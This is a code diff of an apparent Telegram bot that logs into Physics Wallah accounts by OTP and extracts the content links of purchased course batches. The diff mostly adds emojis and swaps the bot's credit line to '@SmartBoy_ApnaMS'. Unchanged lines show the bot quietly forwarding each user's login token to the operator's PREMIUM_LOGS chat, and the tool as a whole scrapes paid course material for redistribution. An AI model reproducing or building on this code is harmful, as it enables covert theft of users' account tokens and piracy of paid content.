@@ -145,7 +145,7 @@ async def pw_login(app, message):
                 "Content-Type": "application/json"
             }
             
-            await app.send_message(message.chat.id, "🔄 **Sending OTP... Please wait!**")
+            await app.send_message(message.chat.id, "🔄 **Sending OTP... Please wait!😉**")
             otp_response = requests.post(
                 "https://api.penpencil.co/v1/users/get-otp?smsType=0", 
                 headers=headers, 
@@ -153,11 +153,11 @@ async def pw_login(app, message):
             ).json()
 
             if not otp_response.get("success"):
-                await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.**")
+                await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.🥲**")
                 return
             
-            await app.send_message(message.chat.id, "✅ **OTP sent successfully! Please enter your OTP:**")
-            otp_msg = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received:**")
+            await app.send_message(message.chat.id, "✅ **OTP sent successfully! Please enter your OTP😘:**")
+            otp_msg = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received😋:**")
             otp = otp_msg.text.strip()
 
             token_payload = {
@@ -182,14 +182,14 @@ async def pw_login(app, message):
                 await message.reply_text("❌ **Login failed! Invalid OTP.**")
                 return
             
-            dl = (f"✅ ** PW Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
+            dl = (f"✅ ** PW Login Successful!😍**\n\n🔑 **Here is your token:**\n`{token}`")
             await message.reply_text(f"✅ **Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
             await app.send_message(PREMIUM_LOGS, dl)
         
         elif user_input.startswith("e"):
             token = user_input
         else:
-            await message.reply_text("❌ **Invalid input! Please provide a valid mobile number or token.**")
+            await message.reply_text("❌ **Invalid input! Please provide a valid mobile number or token.😓**")
             return
 
 
@@ -213,7 +213,7 @@ async def pw_login(app, message):
             return
 
 
-        batch_text = "📚 **Your Batches:**\n\n"
+        batch_text = "📚 **Your Batches:😚**\n\n"
         batch_map = {}
         for batch in batches:
             bi = batch.get("_id")
@@ -262,7 +262,7 @@ async def pw_login(app, message):
         all_links = []
 
         async def update_progress():
-            progress_text = "📊 **Extraction Progress**\n\n"
+            progress_text = "📊 **Extraction Progress🥳**\n\n"
             for subject, status in all_subjects_progress.items():
                 icon = "✅" if status else "⏳"
                 progress_text += f"{icon} **{subject}**\n"
@@ -295,14 +295,14 @@ async def pw_login(app, message):
                 f.write(line + "\n")
             
             f.write("\n━━━━━━━━━━━━━━━━━━━━━\n")
-            f.write("🌟 Join Us: @UGxPrivate\n")
-            f.write("━━━━━━━━━━━━━━━━━━━━━")
+            f.write("🌟 Extracted By: @SmartBoy_ApnaMS\n")
+            f.write("∘₊✦━━━❖💛𝗝𝗕💚❖━━━✦₊∘")
 
         end_time = time.time()
         extraction_time = end_time - start_time
 
         up = (f"**Login Succesfull for PW:** `{token}`")
-        captionn = (f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}")
+        captionn = (f" App Name😎 : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}")
         caption = (
                  f"࿇ ══━━ 🏦 ━━══ ࿇\n\n"
                  f"🌀 **Aᴘᴘ Nᴀᴍᴇ** : ᴘʜʏsɪᴄs ᴡᴀʟʟᴀʜ (𝗣𝘄)\n"
@@ -310,7 +310,7 @@ async def pw_login(app, message):
                  f"✳️**Bᴀᴛᴄʜ ID** : **{target_id}**\n"
                  f"🎯 **Bᴀᴛᴄʜ Nᴀᴍᴇ** : `{batch_name}`\n"
                  f"⚡ **Extraction Time**: {extraction_time:.2f}s\n\n"
-                 f"🌐 **Jᴏɪɴ Us** : {join}\n"
+                 f"🌐 **Extracted By:** : @SmartBoy_ApnaMS\n"
                  f"❄️ **Dᴀᴛᴇ** : {time_new}")
 
         await app.send_document(chat_id=message.chat.id, document=filename, caption=caption)
